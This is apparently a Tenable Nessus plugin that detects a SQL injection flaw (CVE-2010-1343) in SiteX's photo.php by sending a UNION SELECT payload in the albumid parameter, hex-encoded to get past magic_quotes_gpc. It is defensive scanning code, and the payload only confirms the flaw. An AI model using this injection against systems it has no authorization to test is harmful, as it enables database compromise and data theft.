#
# (C) Tenable Network Security, Inc.
#


if (NASL_LEVEL < 3000) exit(1);


include("compat.inc");


if (description)
{
  script_id(45360);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2016/05/19 18:02:18 $");

  script_cve_id("CVE-2010-1343");
  script_bugtraq_id(38976);
  script_osvdb_id(63283);
  script_xref(name:"EDB-ID", value:"11881");

  script_name(english:"SiteX photo.php albumid Parameter SQL Injection");
  script_summary(english:"Tries to manipulate the album number for a non-existent album id");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is susceptible to a
SQL injection attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of SiteX hosted on the remote web server fails to
sanitize input to the 'albumid' parameter of the 'photo.php' script
before using it in a database query.

Provided PHP's 'magic_quotes_gpc' setting is disabled, an
unauthenticated, remote attacker can leverage this issue to manipulate
SQL queries and, for example, uncover sensitive information from the
associated database, read arbitrary files, or execute arbitrary PHP
code."
  );
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/03/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/03/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE);


# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/sitex", cgi_dirs()));
else dirs = make_list(cgi_dirs());

script_found = FALSE;
foreach dir (dirs)
{
  # Try to exploit the issue to manipulate the album name for a
  # non-existent album id.
  exploit = "-" + rand() % 1000 + "' UNION SELECT 1," + hexify(str:SCRIPT_NAME) + ",3,4,5,6,7,8 -- '";
  url = dir + '/photo.php?' +
    'albumid=' + str_replace(find:" ", replace:"%20", string:exploit);

  res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);
  if (
    res[2] &&
    (
      '.sxGalleryThumb' >< res[2] ||
      'SITEX CORE STYLES' >< res[2] ||
      'SiteX experienced error' >< res[2] ||
      '/journal.php">My Blog' >< res[2]
    )
  )
  {
    script_found = TRUE;

    if ('&page=">Back to album "' + SCRIPT_NAME + '"</a>' >< res[2])
    {
      set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

      if (report_verbosity > 0)
      {
        report = '\n' +
          'Nessus was able to verify the issue by manipulating the album name\n' +
          'for a non-existent album id using the following URL :\n' +
          '\n' +
          '  ' + build_url(port:port, qs:url) + '\n';
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      exit(0);
    }
  }
}
if (!script_found) exit(0, "SiteX was not found on the web server on port "+port+".");
else exit(0, "The SiteX install at "+build_url(port:port, qs:dir+'/')+" is not affected.");
